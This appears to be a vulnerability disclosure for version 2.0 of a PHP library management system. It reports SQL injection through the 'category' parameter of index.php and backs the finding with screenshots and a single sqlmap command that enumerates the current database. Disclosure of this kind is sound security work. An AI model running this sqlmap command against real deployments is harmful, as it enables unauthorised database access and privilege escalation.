**Title:** Library Management System In PHP With Source Code (Ver.2.0) index.php sql Injection 

**Vendor:** Fabian Ros [Library Management System In PHP With Source Code (Ver.2.0) - Source Code & Projects](https://code-projects.org/library-management-system-in-php-with-source-code-ver-2-0/)

**Impact Escalation of Privileges:** true

**Affected Product Version**: 2.0

**Vulnerability Type**: SQL Injection

**Audit:**

/index.php

The `category` parameter is is injected into the query unfiltered.

![image-20250702145804985](./images/image-20250702145804985.png)

![image-20250702145749617](./images/image-20250702145749617.png)



**Verify**

1. Prepare request txt `b.txt`

   ![image-20250702150833397](./images/image-20250702150833397.png)

2. sqlmap exploit

```shell
sqlmap -r b.txt -p category  --batch --current-db --flush-session
```

![image-20250702150306018](./images/image-20250702150306018.png)



![image-20250702151202285](./images/image-20250702151202285.png)